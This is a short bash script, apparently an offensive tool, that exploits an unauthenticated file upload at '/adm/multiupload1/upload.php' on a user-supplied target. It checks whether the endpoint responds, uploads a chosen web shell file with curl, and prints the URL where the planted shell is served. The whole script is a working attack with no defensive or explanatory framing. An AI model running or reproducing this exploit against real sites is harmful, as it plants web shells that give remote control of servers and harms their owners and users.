#!/bin/bash
vulnpath="/adm/multiupload1/upload.php"
RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT}1337r0j4n
EOF
read -p " Target: " target
check=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" $target/$vulnpath)
checkx=$(curl -s --max-time 10 $target/$vulnpath)
if [[ $check == "200" || $checkx == "" ]]; then
read -p " Shell: " shell
if [[ -f $shell ]]; then
upshell=$(curl -s --max-time 10 -F "file=@$shell" $target/$vulnpath)
echo -e " Bingo: ${GREEN}$target/adm/multiupload1/uploads/$shell${RESAT}"
else
echo -e " Make sure $file is exist or not Budy"
fi
else
echo -e " Damn it.."
echo -e " $target wasn't vuln Budy ${PURPLE}:(${RESAT}"
exit;
fi
